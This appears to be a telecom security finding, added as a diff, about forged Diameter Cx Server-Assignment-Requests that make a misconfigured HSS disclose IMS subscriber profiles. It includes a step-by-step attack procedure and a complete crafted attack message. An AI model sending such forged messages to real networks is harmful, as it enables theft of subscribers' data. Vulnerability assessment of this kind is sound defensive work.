@@ -1,0 +1,99 @@
+**Threat Model:**
+- **Attack Assumption:** A misconfigured HSS exposes the Cx Diameter application on the public Internet. The attacker can impersonate an S-CSCF, establish an unauthenticated Diameter connection to the HSS, and send forged **Server-Assignment-Request (SAR)** messages for a known IMS subscriber identity.
+- **Attacker Capability:** The attacker can only send crafted SAR requests on its own connection to the HSS and receive SAAs on that same connection. The attacker cannot observe or interfere with traffic between the legitimate S-CSCF, P-CSCF, UE, or other IMS nodes.
+
+**Exploitability Analysis:**
+`User-Data-Already-Available` in Cx SAR is **authoritative control input** to the HSS, not descriptive metadata. It tells the HSS whether the requesting S-CSCF already has the subscriber profile data, and therefore whether the HSS should return `User-Data` in the SAA.
+
+The field-specific effect is direct: if the attacker sets `User-Data-Already-Available = USER_DATA_NOT_AVAILABLE`, the HSS can be induced to include the subscriber's IMS user profile in the answer sent back to the spoofed S-CSCF connection. If the value says the data is already available, the HSS may omit that profile. Thus changing this AVP changes whether sensitive subscriber service-profile data is released in the response.
+
+That makes the field independently security-relevant under the threat model. The forged SAR is the delivery vehicle, but the disclosure decision is controlled by the value of `User-Data-Already-Available` itself.
+
+A concrete field-driven abuse is to send a SAR for a known subscriber with `User-Data-Already-Available = USER_DATA_NOT_AVAILABLE`. The expected result is that the HSS accepts the request and returns an SAA containing `User-Data`, exposing IMS service-profile XML or equivalent subscriber profile content to the attacker-controlled connection.
+
+
+The impact is subscriber-scoped information disclosure rather than deregistration or persistent state corruption. It is still attributable to this field because the response body differs specifically based on whether the HSS believes the S-CSCF already has user data.
+
+**Attack Procedure:**
+1. Establish a Diameter Cx connection to the target HSS while impersonating a plausible S-CSCF peer.
+2. Craft a minimal but coherent **Server-Assignment-Request (Command-Code 301, Application-Id 16777216)**.
+3. Include only mandatory and coherence-related AVPs: `Session-Id`, `Vendor-Specific-Application-Id`, `Auth-Session-State`, `Origin-Host`, `Origin-Realm`, `Destination-Realm`, `Server-Name`, `Server-Assignment-Type`, `User-Data-Already-Available`, plus identity AVPs needed for meaningful processing.
+4. Set the target field `User-Data-Already-Available` to the malicious test value **`USER_DATA_NOT_AVAILABLE (0)`**.
+5. Use a real-looking `User-Name` / `Public-Identity` pair for the victim subscriber and a syntactically plausible S-CSCF `Server-Name`.
+6. Expected success condition: the HSS accepts the SAR and the returned SAA contains `User-Data` or equivalent subscriber profile data attributable to the `USER_DATA_NOT_AVAILABLE` value.
+
+Only mandatory and coherence-related fields are included below; unrelated AVPs are intentionally omitted.
+
+**Attack Message:**
+```json
+{
+  "diameter_header": {
+    "command_code": 301,
+    "application_id": 16777216,
+    "request": true,
+    "proxiable": true
+  },
+  "avps": [
+    {
+      "avp_name": "Session-Id",
+      "avp_value": "attacker.scscf.example.net;1710000000;1"
+    },
+    {
+      "avp_name": "Vendor-Specific-Application-Id",
+      "grouped_avp": [
+        {
+          "avp_name": "Vendor-Id",
+          "avp_value": 10415
+        },
+        {
+          "avp_name": "Auth-Application-Id",
+          "avp_value": 16777216
+        }
+      ]
+    },
+    {
+      "avp_name": "Auth-Session-State",
+      "avp_value": 1
+    },
+    {
+      "avp_name": "Origin-Host",
+      "avp_value": "scscf1.attacker.example.net"
+    },
+    {
+      "avp_name": "Origin-Realm",
+      "avp_value": "attacker.example.net"
+    },
+    {
+      "avp_name": "Destination-Realm",
+      "avp_value": "ims.mnc001.mcc001.3gppnetwork.org"
+    },
+    {
+      "avp_name": "Destination-Host",
+      "avp_value": "hss1.ims.mnc001.mcc001.3gppnetwork.org"
+    },
+    {
+      "avp_name": "User-Name",
+      "avp_value": "user001@ims.mnc001.mcc001.3gppnetwork.org"
+    },
+    {
+      "avp_name": "Public-Identity",
+      "avp_value": "sip:user001@ims.mnc001.mcc001.3gppnetwork.org"
+    },
+    {
+      "avp_name": "Server-Name",
+      "avp_value": "sip:scscf1.attacker.example.net"
+    },
+    {
+      "avp_name": "Server-Assignment-Type",
+      "avp_value": "REGISTRATION"
+    },
+    {
+      "avp_name": "User-Data-Already-Available",
+      "avp_value": 0
+    }
+  ]
+}
+```
+
+**Classification:**
+EXPLOITABLE
